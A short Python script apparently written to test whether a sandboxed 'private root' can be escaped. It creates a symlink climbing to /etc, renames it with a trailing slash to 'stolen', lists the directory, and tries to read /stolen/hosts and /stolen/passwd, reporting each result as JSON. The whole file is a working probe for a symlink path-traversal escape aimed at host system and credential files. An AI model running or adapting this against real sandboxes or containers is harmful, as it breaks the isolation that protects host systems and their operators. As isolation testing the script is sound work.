import os, json
r=[]
os.chdir("/")
# can we create a symlink and rename-with-slash in the private root?
try:
    os.symlink("../../../../../../etc","esc"); r.append(("symlink ../../etc","ok"))
except OSError as e: r.append(("symlink",f"errno {e.errno} {e.strerror}"))
try:
    os.rename("esc/","stolen"); r.append(("rename esc/->stolen","ok"))
except OSError as e: r.append(("rename",f"errno {e.errno} {e.strerror}"))
try:
    r.append(("listdir /stolen", sorted(os.listdir("/stolen"))[:8]))
except OSError as e: r.append(("listdir /stolen",f"errno {e.errno} {e.strerror}"))
for cand in ("/stolen/hosts","/stolen/passwd"):
    try:
        open(cand).read(1); r.append(("READ "+cand,"ok (host file reachable)"))
    except OSError as e: r.append(("read "+cand,f"errno {e.errno} {e.strerror}"))
print("RESULT "+json.dumps(r))
